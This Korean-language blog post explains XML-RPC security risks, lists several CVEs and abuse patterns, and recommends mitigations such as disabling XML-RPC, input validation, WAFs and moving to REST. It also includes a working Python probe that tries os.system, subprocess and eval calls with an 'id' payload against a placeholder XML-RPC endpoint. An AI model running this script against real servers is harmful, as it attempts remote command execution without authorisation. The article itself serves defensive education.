---
title: "XML-RPC 보안 취약점 분석 및 완화 전략"
date: 2025-03-28T08:39:00+09:00
draft: false
tags: ["XML-RPC", "Security", "RCE", "Exploit"]
categories: ["Cybersecurity"]
-----------------------------
![xmlrpc 배경화면](/images/post/xmlrpc-security.png)

## 주요 요약

- **XML-RPC 취약점 개요:** 시스템 간 통신을 위한 경량 원격 호출 프로토콜인 XML-RPC는 명령 주입(RCE), XXE, DDoS, 권한 상승 등 다양한 위협에 노출됩니다.
- **대표 사례:** NodeBB (CVE-2023-43187), Apache OFBiz (CVE-2020-9496), PHP XML-RPC (CVE-2005-1921) 등.
- **실제 사용처:** WordPress, Bugzilla, ManageEngine, Apache OFBiz 외에도 일부 레거시 시스템에서 활용 중입니다.
- **완화 전략:** XML-RPC 비활성화, 입력 검증 강화, 인증 체계 강화, 최신 보안 패치 적용, 접근 제어 및 WAF 도입.

## XML-RPC란 무엇인가?

\*\*XML-RPC (XML Remote Procedure Call)\*\*는 XML을 데이터 포맷으로, HTTP를 전송 수단으로 사용하는 원격 프로시저 호출(RPC) 프로토콜입니다. 1998년 Dave Winer와 Microsoft가 공동 제안했으며, 플랫폼 간 통신을 간편화하기 위해 설계되었습니다.

### 기본 원리

- 클라이언트가 XML 형식으로 요청을 보내면 서버가 XML로 응답을 반환합니다.
- 표준 HTTP(S)를 활용해 방화벽을 쉽게 통과할 수 있습니다.

### XML-RPC의 역사

XML-RPC는 초기 웹 서비스에서 널리 쓰였으며, Perl, Java, Python, C, PHP 등 다양한 언어에서 구현되었습니다. 이후 SOAP로 발전했지만, 단순성 때문에 일부 환경에서 지속적으로 활용되었습니다.

### XML-RPC의 현재

RESTful API 및 gRPC 등 최신 기술의 등장으로 사용이 점차 감소하고 있습니다. WordPress도 REST API로 전환 중이며, 레거시 시스템에서만 제한적으로 활용되는 추세입니다.

## 취약점 분석

### 1. XML 주입 및 원격 코드 실행 (RCE)

- **NodeBB (CVE-2023-43187):** XML 입력 미검증으로 RCE 가능
- **Apache OFBiz (CVE-2020-9496):** Java 역직렬화 기반 RCE
- **PHP XML-RPC (CVE-2005-1921):** eval() 오용을 통한 RCE 가능

### 2. XXE (XML External Entity)

- **Apache XML-RPC (CVE-2016-5002):** 외부 엔티티 비활성화 누락으로 로컬 파일 노출 및 SSRF 가능

### 3. DDoS 및 Brute Force 공격

- **system.multicall:** 무차별 대입 공격 자동화
- **pingback.ping:** DDoS 중계 공격 수행

### 4. 인증 우회 및 권한 상승

- **WordPress (CVE-2020-28036):** XML-RPC를 통한 인증 우회

## 실제 공격 사례

- **SonicWall 보고서 (2018):** XML-RPC 공격 10만 건 이상 감지
- **WPbrutebot:** XML-RPC 기반 Brute-force 공격
- **Pingback DDoS:** XML-RPC를 이용한 대규모 중계 공격

## XML-RPC 익스플로잇 예시

아래는 Python 기반으로 동작하는 XML-RPC의 RCE 취약점 탐지 Python 코드와 실행 화면입니다.

![xmlrpc poc code 실행 화면](/images/post/xmlrpc-rce.png)

```python
import xmlrpc.client
import ssl
import http.client

candidate_methods = [
    "os.system",
    "commands.getoutput",
    "subprocess.check_output",
]

candidate_methods_eval = [
    "__builtin__.eval",
    "builtins.eval",
]

rpc_urls = [
    "https://xxx.com/cgi-bin/rpc.cgi",
]

context = ssl._create_unverified_context()

class UnverifiedTransport(xmlrpc.client.SafeTransport):
    def make_connection(self, host):
        return http.client.HTTPSConnection(host, context=context)

for rpc_url in rpc_urls:
    print(f"[+] Scanning target: {rpc_url}")
    client = xmlrpc.client.ServerProxy(rpc_url, transport=UnverifiedTransport())

    for method in candidate_methods:
        try:
            parts = method.split(".")
            obj = getattr(client, parts[0])
            func = getattr(obj, parts[1])
            print(f"[>] Trying {method}('id')...")
            result = func('id')
            if isinstance(result, bytes):
                result = result.decode()
            print(f"[✔] {method} → Success! Result: {result}\n")
        except Exception as e:
            print(f"[-] {method} blocked: {e}")

    for method in candidate_methods_eval:
        try:
            parts = method.split(".")
            obj = getattr(client, parts[0])
            func = getattr(obj, parts[1])
            payload = '__import__("commands").getoutput("id")'
            print(f"[>] Trying {method}('{payload}')...")
            result = func(payload)
            if isinstance(result, bytes):
                result = result.decode()
            print(f"[✔] {method} → Success! Result: {result}\n")
        except Exception as e:
            print(f"[-] {method} blocked: {e}")
```

> ⚠️ 본 스크립트는 반드시 허가된 환경에서만 사용하세요.

## XML-RPC 활용 중인 대표 서비스

| 시스템          | 활용 예시                         |
| ------------ | ----------------------------- |
| WordPress    | 게시, 댓글, pingback (REST로 전환 중) |
| Bugzilla     | 버그 등록 및 수정 API                |
| ManageEngine | 사용자 계정 및 비밀번호 관리              |
| Apache OFBiz | ERP 연동 API                    |

## 보안 강화 방안

- XML-RPC 비활성화 (.htaccess, 웹서버 설정, 플러그인)
- 입력 검증 강화 (정규식 기반)
- XXE 방지 설정 적용
- API 키, OAuth, JWT 인증 적용
- IP 기반 접근 제한
- 웹 애플리케이션 방화벽(WAF) 도입
- 로그 모니터링 및 정기적 취약점 점검 수행

## 현대 대체 기술 비교

| 항목     | XML-RPC | REST   | GraphQL |
| ------ | ------- | ------ | ------- |
| 데이터 형식 | XML     | JSON   | JSON    |
| 구조     | 메서드 기반  | 리소스 기반 | 쿼리 기반   |
| 확장성    | 낮음      | 높음     | 매우 높음   |
| 보안성    | 낮음      | 중간 이상  | 중간 이상   |
| 장점     | 간단 구현   | 캐싱 가능  | 데이터 최소화 |

## 결론 및 제언

- **XML-RPC는 보안 위험이 높아 사용을 자제하세요.**
- **불가피한 경우, 강력한 인증 및 접근 제어를 반드시 적용하세요.**
- **REST 또는 GraphQL로의 전환을 적극 권장합니다.**

## 참조 링크

- [XML-RPC - Wikipedia](https://ko.wikipedia.org/wiki/XML-RPC)
- [CVE-2023-43187 - NodeBB XML Injection](https://nvd.nist.gov/vuln/detail/CVE-2023-43187)
- [CVE-2020-9496 - Apache OFBiz RCE](https://nvd.nist.gov/vuln/detail/CVE-2020-9496)
- [CVE-2005-1921 - PHP XMLRPC Code Injection](https://nvd.nist.gov/vuln/detail/CVE-2005-1921)
- [CVE-2016-5002 - Apache XML-RPC XXE](https://nvd.nist.gov/vuln/detail/CVE-2016-5002)
- [WordPress XML-RPC 보안 가이드 (SolidWP)](https://solidwp.com/blog/xmlrpc-php/)
- [SonicWall XML-RPC 공격 분석 보고서](https://www.sonicwall.com/blog/major-attempt-to-exploit-xml-rpc-remote-code-injection-vulnerability-is-observed)


